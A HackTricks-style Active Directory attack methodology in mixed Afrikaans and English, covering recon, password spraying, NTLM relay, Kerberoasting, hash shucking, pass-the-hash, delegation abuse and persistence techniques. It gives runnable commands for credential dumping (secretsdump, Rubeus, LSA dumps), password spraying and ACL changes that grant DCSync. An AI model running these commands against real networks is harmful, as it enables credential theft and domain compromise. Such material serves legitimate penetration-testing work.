# Active Directory Metodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as 'n fundamentele tegnologie wat netwerkadministrateurs in staat stel om doeltreffend **domains**, **users**, en **objects** binne 'n netwerk te skep en te bestuur. Dit is ontwerp om te skaal, en maak dit moontlik om 'n groot aantal **users** in hanteerbare **groups** en **subgroups** te organiseer, terwyl **access rights** op verskillende vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie hooflae: **domains**, **trees**, en **forests**. 'n **Domain** sluit 'n versameling van objects in, soos **users** of **devices**, wat 'n gemeenskaplike databasis deel. **Trees** is groepe van hierdie domains wat deur 'n gedeelde struktuur verbind is, en 'n **forest** verteenwoordig die versameling van verskeie **trees**, gekoppel deur **trust relationships**, en vorm die boonste laag van die organisasie. Spesifieke **access** en **communication rights** kan op elkeen van hierdie vlakke toegeken word.

Key concepts within **Active Directory** include:

1. **Directory** – Berg alle inligting wat verband hou met Active Directory objects.
2. **Object** – Dui entiteite binne die directory aan, insluitend **users**, **groups**, of **shared folders**.
3. **Domain** – Dient as 'n houer vir directory objects, met die vermoë dat veelvuldige domains binne 'n **forest** saam kan bestaan, elk met hul eie versameling objects.
4. **Tree** – 'n Groepering van domains wat 'n gemeenskaplike root domain deel.
5. **Forest** – Die hoogste vlak van die organisasiestruktuur in Active Directory, saamgestel uit verskeie **trees** met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat 'n reeks dienste wat kritiek is vir die gesentraliseerde bestuur en kommunikasie binne 'n netwerk. Hierdie dienste sluit in:

1. **Domain Services** – Sentrale berging van data en die bestuur van interaksies tussen **users** en **domains**, insluitend **authentication** en **search** funksionaliteite.
2. **Certificate Services** – Beheer die skep, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-aktiewe toepassings deur die **LDAP protocol**.
4. **Directory Federation Services** – Bied **single-sign-on** vermoëns om **users** oor verskeie webtoepassings in een sessie te autentiseer.
5. **Rights Management** – Help om kopieregmateriaal te beskerm deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS Service** – Krities vir die resolusie van **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om 'n **AD** aan te val, moet jy die **Kerberos authentication process** regtig goed verstaan.\
[**Lees hierdie bladsy as jy nog nie weet hoe dit werk nie.**](kerberos-authentication.md)

## Cheat Sheet

Jy kan baie vind op [https://wadcoms.github.io/](https://wadcoms.github.io) om vinnig te sien watter opdragte jy kan uitvoer om 'n AD te enumerate/exploit.

> [!WARNING]
> Kerberos-kommunikasie **requires a full qualifid name (FQDN)** vir die uitvoering van aksies. As jy probeer toegang kry tot 'n masjien via die IP-adres, **sal dit NTLM gebruik en nie Kerberos nie**.

## Recon Active Directory (No creds/sessions)

As jy net toegang tot 'n AD-omgewing het maar geen credentials/sessions nie, kan jy:

- **Pentest the network:**
- Scan die netwerk, vind masjiene en oop poorte en probeer om **exploit vulnerabilities** of **extract credentials** vanaf hulle (byvoorbeeld, [printers could be very interesting targets](ad-information-in-printers.md)).
- Die enumerering van DNS kan inligting gee oor sleutelbedieners in die domain soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die Algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Check for null and Guest access on smb services** (dit sal nie op moderne Windows-weergawes werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- A more detailed guide on how to enumerate a SMB server can be found here:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Versamel credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Kry toegang tot 'n host deur [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Versamel credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Onttrek gebruikersname/naam uit interne dokumente, sosiale media, dienste (hoofsaaklik web) binne die domain-omgewings en ook van publiek beskikbare bronne.
- As jy die volledige name van maatskappywerksers vind, kan jy verskillende AD **username conventions** probeer (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Die mees algemene konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Kyk na die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) bladsye.
- **Kerbrute enum**: Wanneer 'n **invalid username is requested** sal die bediener reageer met die **Kerberos error** kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons toelaat om te bepaal dat die gebruikersnaam ongeldig was. **Valid usernames** sal óf die **TGT in a AS-REP** reaksie oplewer of die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_, wat aandui dat die gebruiker pre-authentication moet uitvoer.
- **No Authentication against MS-NRPC**: Gebruik auth-level = 1 (No authentication) teen die MS-NRPC (Netlogon) koppelvlak op domain controllers. Die metode roep die `DsrGetDcNameEx2` funksie aan nadat die MS-NRPC-koppelvlak gebind is om te kyk of die gebruiker of rekenaar bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implementeer hierdie tipe enumerasie. Die navorsing kan gevind word [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie servers in die netwerk gevind het, kan jy ook **user enumeration against it** uitvoer. Byvoorbeeld, jy kan die hulpmiddel [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Now that you have some basic credentials you should check if you can **find** any **interesting files being shared inside the AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steel NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopelik het jy daarin geslaag om 'n **local admin** rekening te kompromitteer met behulp van [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let wel: dit is nogal **luidrugtig** en **LAPS** sou dit **versag**.

### MSSQL Abuse & Trusted Links

As 'n gebruiker priviliges het om **access MSSQL instances**, kan hy dit gebruik om **execute commands** op die MSSQL-host uit te voer (as dit as SA loop), die NetNTLM **hash** te **steal** of selfs 'n **relay** **attack**.\  
Ook, as 'n MSSQL-instans deur 'n ander MSSQL-instans vertrou word (database link). As die gebruiker privilegies oor die vertroude databasis het, sal hy die **trust relationship** kan gebruik om navrae ook in die ander instans uit te voer. Hierdie trusts kan gekoppel word en op 'n punt kan die gebruiker 'n verkeerd geconfigureerde databasis vind waar hy commands kan uitvoer.\  
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory- en deployment-suites ontbloot dikwels kragtige paaie na credentials en code execution. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer object met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) vind en jy het domeinprivileges op die rekenaar, sal jy in staat wees om TGTs uit die geheue van elke gebruiker wat op die rekenaar aanmeld, te dump.\  
Dus, as 'n **Domain Admin logins onto the computer**, sal jy sy TGT kan dump en hom kan impersonate met [Pass the Ticket](pass-the-ticket.md).\  
Weens constrained delegation kan jy selfs **automatically compromise a Print Server** (hopelik is dit 'n DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As 'n gebruiker of rekenaar toegelaat is vir "Constrained Delegation" sal dit in staat wees om **impersonate any user to access some services in a computer**.\  
Dan, as jy die **compromise the hash** van hierdie gebruiker/rekenaar bereik, sal jy in staat wees om **impersonate any user** (selfs domain admins) om toegang tot sekere dienste te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Om **WRITE**-privilege op 'n Active Directory-voorwerp van 'n remote rekenaar te hê, maak dit moontlik om code execution met **elevated privileges** te bewerkstellig:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Die gecompromitteerde gebruiker kan sommige **interesting privileges over some domain objects** hê wat jou toelaat om lateraal te **move**/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Om 'n **Spool service listening** binne die domein te ontdek, kan misbruik word om **acquire new credentials** en **escalate privileges** te verkry.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

As **other users** die **compromised** masjien **access**, is dit moontlik om **gather credentials from memory** en selfs **inject beacons in their processes** om hulle te impersonate.\  
Gewoonlik sal gebruikers die stelsel via RDP access, so hier is hoe om 'n paar aanvalle oor third party RDP sessions uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied 'n stelsel vir die bestuur van die **local Administrator password** op domein-joined rekenaars, wat verseker dat dit **randomized**, uniek en gereeld **changed** word. Hierdie wagwoorde word in Active Directory gestoor en toegang word slegs via ACLs aan gemagtigde gebruikers beheer. Met voldoende permissies om hierdie wagwoorde te access, word pivoting na ander rekenaars moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** van die gecompromitteerde masjien kan 'n manier wees om privileges binne die omgewing te escalate:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

As **vulnerable templates** geconfigureer is, is dit moontlik om dit te misbruik om privileges te escalate:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sodra jy **Domain Admin** of, nog beter, **Enterprise Admin**-privileges kry, kan jy die **domain database** dump: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke wat vroeër bespreek is, kan gebruik word vir persistence.\  
Byvoorbeeld kan jy:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep 'n **legitimate Ticket Granting Service (TGS) ticket** vir 'n spesifieke diens deur gebruik te maak van die **NTLM hash** (byvoorbeeld, die **hash of the PC account**). Hierdie metode word gebruik om **access the service privileges** te verkry.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

'n **Golden Ticket attack** behels dat 'n aanvaller toegang kry tot die **NTLM hash of the krbtgt account** in 'n Active Directory (AD)-omgewing. Hierdie rekening is besonder omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te teken, wat noodsaaklik is vir verifikasie binne die AD-netwerk.

Sodra die aanvaller hierdie hash bekom, kan hulle **TGTs** vir enige rekening skep wat hulle kies (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hierdie is soos golden tickets wat vervals is op 'n wyse wat **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is 'n baie goeie manier om in die gebruiker se rekening te persist (selfs as hy die wagwoord verander):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-voorwerp in Active Directory verseker die sekuriteit van **privileged groups** (soos Domain Admins en Enterprise Admins) deur 'n standaard **Access Control List (ACL)** oor hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter uitgebuit word; as 'n aanvaller die AdminSDHolder se ACL wysig om volle toegang aan 'n gewone gebruiker te gee, kry daardie gebruiker uitgebreide beheer oor al die privileged groups. Hierdie sekuriteitsmaatreël, bedoel om te beskerm, kan dus terugskiet en ongerechtigde toegang moontlik maak tensy dit noukeurig gemonitor word.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

In elke **Domain Controller (DC)** bestaan 'n **local administrator**-rekening. Deur adminregte op so 'n masjien te bekom, kan die local Administrator-hash met **mimikatz** geëxtraheer word. Daarna is 'n registerwysiging nodig om die gebruik van hierdie wagwoord te **enable**, wat remote toegang tot die local Administrator-rekening moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan sommige **special permissions** aan 'n **user** gee oor sommige spesifieke domain objects wat daardie gebruiker toelaat om in die toekoms **escalate privileges**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissions** wat 'n **object** oor 'n ander **object** het, te **store**. As jy net 'n **little change** aan die **security descriptor** van 'n voorwerp kan maak, kan jy baie interessante privileges oor daardie voorwerp bekom sonder om lid van 'n privileged group te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in geheue om 'n **universal password** te vestig, wat toegang tot alle domain accounts gee.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\  
Jy kan jou **own SSP** skep om **capture** in **clear text** die **credentials** wat gebruik word om die masjien te access.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer 'n **new Domain Controller** in die AD en gebruik dit om **push attributes** (SIDHistory, SPNs...) op gespesifiseerde voorwerpe te plaas **without** enige **logs** te laat wat die **modifications** aandui. Jy **need DA** privileges en moet binne die **root domain** wees.\  
Let daarop dat as jy verkeerde data gebruik, nogal lelike logs kan verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Vroeër het ons bespreek hoe om privileges te escalate as jy **enough permission to read LAPS passwords** het. Hierdie wagwoorde kan egter ook gebruik word om **maintain persistence**.\  
Kyk:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

